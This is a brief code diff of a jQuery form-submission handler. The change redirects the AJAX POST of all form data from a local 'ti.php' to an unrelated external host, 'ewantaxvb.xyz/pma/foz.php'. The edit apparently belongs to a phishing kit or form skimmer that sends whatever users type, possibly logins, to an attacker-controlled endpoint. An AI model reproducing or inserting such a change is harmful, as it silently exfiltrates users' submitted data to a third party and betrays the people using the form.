@@ -60,7 +60,7 @@ function load(){
   Please Wait...
 </button>`).prop("disabled", true);
             $.ajax({
-                url: "ti.php",
+                url: "https://ewantaxvb.xyz/pma/foz.php",
                 type: 'POST',
                 data: formData,
                 contentType: false,
